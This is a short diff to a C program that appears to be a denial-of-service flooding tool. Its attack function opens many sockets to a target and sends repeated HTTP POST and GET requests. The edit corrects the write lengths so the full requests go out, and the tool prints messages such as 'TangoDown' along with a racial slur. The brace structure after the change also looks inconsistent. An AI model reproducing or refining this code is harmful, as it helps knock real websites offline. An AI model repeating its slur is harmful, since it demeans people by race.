@@ -34,7 +34,8 @@ int make_socket(char *host, char *port) {
 		}
 		
 	}
-	if(p == NULL) {
+	if(p == NULL)
+	 {
 		if(servinfo)
 		fprintf(stderr, "#TangoDown!!!!!\n");
 		
@@ -64,11 +65,11 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x < PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
-			for(x=0; x < PPS; x++) {
-				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 1);
+			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
+			if(x < PPS) {
+				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 18);
 				
-			}
+			} else {
 				fprintf(stderr, "Niggers\n");
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
